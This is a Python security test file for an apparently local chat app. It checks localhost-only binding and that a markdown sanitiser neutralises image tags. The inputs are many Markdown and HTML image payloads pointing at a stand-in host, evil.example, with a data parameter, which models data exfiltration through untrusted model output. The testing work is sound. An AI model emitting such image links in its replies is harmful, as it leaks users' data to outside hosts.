"""Local means localhost, and model output is untrusted.

Run:  uv run python tests/test_security.py
"""

import re
import sys
import tomllib
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from _check import check, finish  # noqa: E402

from nmv.render import safe_markdown  # noqa: E402

print("config.toml")
config = tomllib.loads((ROOT / ".streamlit/config.toml").read_text())
address = config.get("server", {}).get("address")
check("listens on localhost only", address in ("localhost", "127.0.0.1"), str(address))

print("safe_markdown neutralises images")
URL = "https://evil.example/?d=42"
NEUTRALISED = {
    "inline": (f"Total ![a]({URL}) due", "Total [image: a] due"),
    "no alt": (f"![]({URL})", "[image]"),
    "title": (f'![a]({URL} "t")', "[image: a]"),
    "nested brackets": (f"![a [b] c]({URL})", "[image: a [b] c]"),
    "parentheses in the URL": ("![a](https://evil.example/a(b)c.png)", "[image: a]"),
    "unbalanced paren in a title": (f'![a]({URL} "x(y") after', "[image: a] after"),
    "angle-bracket URL": (f"![a](<{URL}>)", "[image: a]"),
    "multi-line alt": (f"![a\nb]({URL})", "[image: a b]"),
    "unclosed while streaming": ("![a](https://evil.example/?d=4", "[image: a]"),
    "image inside a link": (f"[![a]({URL})](https://ok.example)", None),
    "image inside an image": (f"![![a]({URL})]({URL})", "[image: [a](" + URL + ")]"),
    "bracket hidden in a code span": (f"![a `[` b]({URL})", None),
    "a second bang": (f"!![a]({URL})", "! [image: a]"),
    "bang then a following target": (f"!![a]({URL})({URL})", None),
    "reference": (f"![a][r]\n\n[r]: {URL}\n", "[image: a]\n\n"),
    "reference, label case": (f"![a][R]\n\n[r]: {URL}\n", "[image: a]\n\n"),
    "collapsed reference": (f"![a][]\n\n[a]: {URL}\n", "[image: a]\n\n"),
    "shortcut reference": (f"![a]\n\n[a]: {URL}\n", "[image: a]\n\n"),
    "definition first": (f"[r]: {URL}\n\n![a][r]", "\n[image: a]"),
    "definition on two lines": (f"![a][r]\n\n[r]:\n  {URL}\n", "[image: a]\n\n"),
    "definition in a quote": (f"![a]\n\n> [a]: {URL}\n", None),
    "html": (f'<img src="{URL}" alt="a">', "[image: a]"),
    "html, upper case": (f"<IMG SRC={URL}>", "[image]"),
    "html, unclosed": (f'<img src="{URL}"', "[image]"),
    "html, the image alias": (f'<image src="{URL}">', "[image]"),
    "html then a bang": (f"!<img src={URL}>", None),
}
for name, (source, expected) in NEUTRALISED.items():
    result = safe_markdown(source)
    if expected is not None:
        check(name, result == expected, repr(result))
    bare = result.replace("\\!", "")
    check(f"{name}: nothing can load", "![" not in bare and "<im" not in bare.lower())

print("safe_markdown leaves ordinary Markdown alone")
UNCHANGED = {
    "a plain link": "See [the docs](https://example.com/a(b)).",
    "a reference link": "See [docs][d].\n\n[d]: https://example.com\n",
    "bold and a list": "**Total:** 42\n\n- one\n- two\n",
    "a table": "| a | b |\n|---|---|\n| 1 | 2 |\n",
    "code": "```python\nprint(a[0])\n```\n\n`x = y!`\n",
    "an exclamation": "Paid! [see note](https://example.com)",
    "an escaped bang": "\\![a](https://example.com)",
    "an unfinished image": "![a",
}
for name, source in UNCHANGED.items():
    check(name, safe_markdown(source) == source, repr(safe_markdown(source)))

print("safe_markdown is idempotent")
samples = [source for source, _ in NEUTRALISED.values()] + list(UNCHANGED.values())
for sample in samples:
    once = safe_markdown(sample)
    check(repr(sample)[:50], safe_markdown(once) == once, repr(once))

print("Chat renders through safe_markdown")
chat = (ROOT / "app_pages/chat.py").read_text()
check("no st.write_stream", "write_stream" not in chat)
check("streams through show_reply", "show_reply(" in chat)
bare = re.findall(r"st\.markdown\((?!safe_markdown\()", chat)
check("every st.markdown goes through safe_markdown", not bare, str(bare))

finish()
